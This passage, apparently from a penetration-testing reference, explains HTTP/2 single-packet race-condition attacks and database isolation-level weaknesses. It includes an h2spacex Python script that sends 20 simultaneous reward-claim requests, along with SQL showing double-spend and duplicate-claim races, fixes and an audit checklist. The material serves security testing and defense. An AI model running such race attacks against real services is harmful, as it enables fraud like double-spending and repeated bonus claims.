## 9. HTTP/2 SINGLE-PACKET ATTACK — DETAILED MECHANICS

### 9.1 TCP Nagle Algorithm & Frame Coalescing

TCP's Nagle algorithm (RFC 896) buffers small writes and coalesces them into fewer, larger segments. When an HTTP/2 client writes multiple HEADERS+DATA frames in rapid succession **without flushing between them**, the kernel merges them into a single TCP segment (up to MSS, typically ~1460 bytes on Ethernet).

```text
Application layer:   [Stream 1 H+D] [Stream 3 H+D] [Stream 5 H+D]
                            ↓ TCP Nagle coalescing ↓
TCP segment:         [Stream 1 H+D | Stream 3 H+D | Stream 5 H+D]  ← one packet on the wire
```

- `TCP_NODELAY` **disabled** (default) → Nagle active → coalescing happens naturally
- If `TCP_NODELAY` is set, the client must use `writev()` / gather-write syscall to batch frames
- Practical limit: ~20–30 small requests per 1460-byte MSS; exceeding this splits across packets and degrades synchronization

### 9.2 Server-Side Request Queue Processing

```text
NIC IRQ → kernel recv buffer → HTTP/2 demuxer → concurrent dispatch

  ┌─ Stream 1 → worker thread A ─┐
  ├─ Stream 3 → worker thread B ─┤  sub-microsecond spacing
  └─ Stream 5 → worker thread C ─┘
```

1. Single `recv()` syscall returns the entire segment
2. HTTP/2 frame parser demultiplexes streams from same segment
3. Dispatcher fans out to application worker pool

First-to-last request dispatch gap: **< 100 μs** on modern servers — orders of magnitude tighter than HTTP/1.1 last-byte sync (~1–5 ms network jitter).

### 9.3 HTTP/2 vs HTTP/1.1 Last-Byte Comparison

| Factor | HTTP/2 Single-Packet | HTTP/1.1 Last-Byte |
|--------|---------------------|-------------------|
| Connections needed | 1 | N (one per request) |
| Wire synchronization | Same TCP segment | N segments released "simultaneously" |
| Network jitter impact | Zero (same packet) | Each connection has independent RTT |
| Server dispatch gap | < 100 μs | 1–5 ms typical |
| Practical limit | ~20–30 requests per MTU | Limited by connection setup |

### 9.4 Practical Execution with h2spacex

```python
import h2spacex

h2_conn = h2spacex.H2OnTCPSocket(
    hostname='target.example.com',
    port_number=443
)

headers_list = []
for i in range(20):
    headers_list.append([
        (':method', 'POST'),
        (':path', '/api/v1/rewards/claim'),
        (':authority', 'target.example.com'),
        (':scheme', 'https'),
        ('content-type', 'application/json'),
        ('authorization', 'Bearer TOKEN'),
    ])

h2_conn.setup_connection()
h2_conn.send_ping_frame()
h2_conn.send_multiple_requests_at_once(
    headers_list,
    body_list=[b'{"reward_id":"welcome_bonus"}'] * 20
)
responses = h2_conn.read_multiple_responses()
```

## 10. DATABASE ISOLATION LEVEL EXPLOITATION MATRIX

| Isolation Level | Phenomenon Exploited | Attack Window | Typical Vulnerable Pattern |
|----------------|---------------------|---------------|---------------------------|
| **READ UNCOMMITTED** | Dirty reads | Thread B reads Thread A's uncommitted write | `SELECT balance` sees in-flight deduction, proceeds with stale logic |
| **READ COMMITTED** | Non-repeatable reads (TOCTOU) | Both threads read committed balance, both pass check, both deduct | `SELECT` → app check → `UPDATE` without `FOR UPDATE` |
| **REPEATABLE READ** | Phantom reads | Snapshot isolation hides concurrent inserts; both threads see "0 claims" and insert | `INSERT IF NOT EXISTS` pattern without UNIQUE constraint |
| **SERIALIZABLE** | Advisory lock bypass | Application uses `pg_advisory_lock()` / `GET_LOCK()` with wrong scope or derivable key | Lock key from user input; session-vs-transaction scope mismatch |

### READ COMMITTED TOCTOU (most common in production)

```sql
-- Thread A                            -- Thread B
SELECT balance FROM accounts           SELECT balance FROM accounts
  WHERE id=1;  -- returns 100            WHERE id=1;  -- returns 100
-- app: 100 >= 100 ✓                   -- app: 100 >= 100 ✓
UPDATE accounts SET balance =          UPDATE accounts SET balance =
  balance - 100 WHERE id=1;             balance - 100 WHERE id=1;
COMMIT; -- balance = 0                 COMMIT; -- balance = -100 ← double-spend
```

**Fix verification**: `SELECT ... FOR UPDATE` should block Thread B's SELECT until Thread A commits.

### REPEATABLE READ Phantom Insert

```sql
-- Thread A (snapshot at T0)           -- Thread B (snapshot at T0)
SELECT count(*) FROM claims            SELECT count(*) FROM claims
  WHERE user_id=1 AND coupon='X';        WHERE user_id=1 AND coupon='X';
-- returns 0 (snapshot)                -- returns 0 (snapshot)
INSERT INTO claims ...;                INSERT INTO claims ...;
COMMIT; -- succeeds                    COMMIT; -- succeeds ← duplicate claim
```

**Fix**: `UNIQUE(user_id, coupon_id)` constraint causes one INSERT to fail with duplicate key error regardless of isolation level.

### SERIALIZABLE Advisory Lock Bypass

```sql
-- Application intends: one lock per coupon
SELECT pg_advisory_lock(hashtext('coupon_' || $coupon_id));
-- Bypass vectors:
--   1. Lock is session-scoped but transaction rolls back → lock persists, next txn skips
--   2. Different code path reaches claim logic without acquiring the lock
--   3. Attacker triggers claim via alternative API endpoint that lacks locking
```

### Quick Audit Checklist

```text
□ SHOW TRANSACTION ISOLATION LEVEL — what level is the database running?
□ Does the hot path use SELECT ... FOR UPDATE or explicit row locks?
□ Is the check-then-act sequence inside a single transaction?
□ Are UNIQUE constraints enforced on the critical state table?
□ Multi-instance deployment: is there a distributed lock (Redis SETNX / Zookeeper)?
```
